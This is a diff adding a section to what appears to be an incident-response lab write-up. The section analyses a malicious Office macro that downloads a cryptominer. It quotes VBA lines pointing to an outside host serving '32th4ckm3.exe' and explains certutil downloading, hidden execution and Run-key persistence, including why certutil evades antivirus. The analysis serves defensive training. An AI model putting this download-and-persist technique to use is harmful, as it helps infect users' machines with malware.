@@ -122,6 +122,43 @@ End Sub
 ```
 
 
+strURL = "http://172.233.61.246/32th4ckm3.exe"
+strFilePath = Environ("TEMP") & "\32th4ckm3.exe
+
+they both contain the name of the executable that we have identified as the miner sucking the machine's CPU resources.
+
+
+![66b36e2379a5d0220fc6b99e-1724324602838](https://github.com/user-attachments/assets/c364bb43-a360-49a7-98d8-60d1a5f62d45)
+
+But briefly, it checks if a process with the same name as our suspicious executable is already running; if the process is found, the macro stops executing. This prevents the macro from downloading and running the same executable file multiple times if it's already active.
+
+ the URL of the file to be downloaded is assigned to the variable strURL, while the variable strFilePath is assigned the full path for the downloaded file by combining the system's temporary directory path (obtained via Environ("TEMP")) with the filename of our miner.
+
+ ![66b36e2379a5d0220fc6b99e-1724324602477](https://github.com/user-attachments/assets/3f33b3f0-ed45-4552-b2a4-0fc8bbf8fcb0)
+
+The next instruction constructs a command string to be executed by the command prompt (cmd). The command uses certutil to download the file from strURL to strFilePath.
+
+certutil is a command-line utility in Windows used for managing and manipulating certificates and certificate authority (CA) databases. It is part of the Windows Certificate Services and can perform various functions. This is a very interesting way of stealthily downloading a file because it leverages a legitimate, pre-installed Windows utility, trusted by default and often allowed through security measures. This method avoids the need for additional tools that might be detected by antivirus software. The command generates minimal noise, blending in with normal administrative operations, making it less likely to be flagged.
+
+![66b36e2379a5d0220fc6b99e-1724324602500](https://github.com/user-attachments/assets/dcbd0515-53a3-430c-94b4-980c9b0a5be1)
+
+With the next set of instructions, the command is executed in a hidden window (vbHide), effectively downloading the file without showing the command prompt to the user; then, after 10 seconds (if you enjoyed this little journey into VBA, you can analyse the Wait function defined at the end of the macro to prove that the Wait (10) instruction does just that), the downloaded file is executed in a hidden window.
+
+![66b36e2379a5d0220fc6b99e-1724324602775](https://github.com/user-attachments/assets/711fb637-b8c8-464e-86ba-e9d66ee56439)
+
+Finally, the macro constructs and executes a different command to add a Windows Registry entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run, which ensures that the downloaded file runs every time the user logs in, ensuring persistence by making the executable run at startup.
+
+The Windows Registry is a hierarchical database that stores configuration settings and options for the Windows operating system and installed applications. The Run keys in the Windows Registry specify programs to be automatically executed when a user logs in. For this reason, they are often leveraged by malware to ensure persistence in the infected system even after rebooting. Understanding the Windows Registry goes beyond the scope of this room, but we highly recommend that aspiring incident responders become familiar with it.
+
+Let us make a recap of what we’ve learnt from our analysis of the macro:
+
+The macro, named AutoOpen, executes automatically when the document is opened.
+It immediately checks if a process with a name that matches the malware is already running. In this case, it terminates.
+If there is no such process, the macro leverages certutil to download the malware from a specific URL, and saves it to a temporary directory.
+It then stealthily executes the malware from a hidden command prompt.
+In the same stealthy manner, the macro finally ensures persistence by adding the malware to the Run registry key. This will allow the malware to be executed every time the user logs into the system, even after reboot.
+
+
 
 What is the name of the process active in the attached VM that we suspect could be a miner?
 
